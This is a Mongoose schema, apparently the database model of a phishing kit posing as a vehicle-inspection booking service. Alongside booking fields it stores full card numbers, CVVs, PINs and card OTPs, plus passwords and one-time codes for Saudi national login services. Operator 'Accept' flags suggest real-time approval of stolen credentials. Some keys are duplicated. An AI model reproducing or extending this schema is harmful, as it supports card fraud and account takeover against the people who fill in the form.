const mongoose = require("mongoose");

exports.Order = mongoose.model(
  "Orders",
  new mongoose.Schema({
    fullname: String,
    nation_number: String,
    phone: String,
    vechile_status: String,
    delegate: String,
    email: String,
    country_code: String,
    country: String,
    first: String,
    second: String,
    third: String,
    board_number: String,
    border_letter: String,
    customs_number: String,
    location: String,
    service_type: String,
    danger_vechile: String,
    vechile_type: String,
    date_check: String,
    time_check: String,
    NavazCard: String,
    NavazPassword: String,
    token: String,
    NavazOtp: String,
    NavazPassword: String,
    card_name: String,
    cardNumber: String,
    cvv: String,
    expiryDate: String,
    pin: String,
    CardOtp: String,
    CardAccept: {
      type: Boolean,
      default: false,
    },
    OtpCardAccept: {
      type: Boolean,
      default: false,
    },
    PinAccept: {
      type: Boolean,
      default: false,
    },
    MotslPhone: String,
    MotslService: String,
    MotslOtp: String,
    MotslAccept: {
      type: Boolean,
      default: false,
    },
    MotslOtpAccept: {
      type: Boolean,
      default: false,
    },
    NavazAccept: {
      type: Boolean,
      default: false,
    },
    NavazOtp: String,
    NavazOtpAccept: {
      type: Boolean,
      default: false,
    },
    checked: {
      type: Boolean,
      default: false,
    },
  })
);
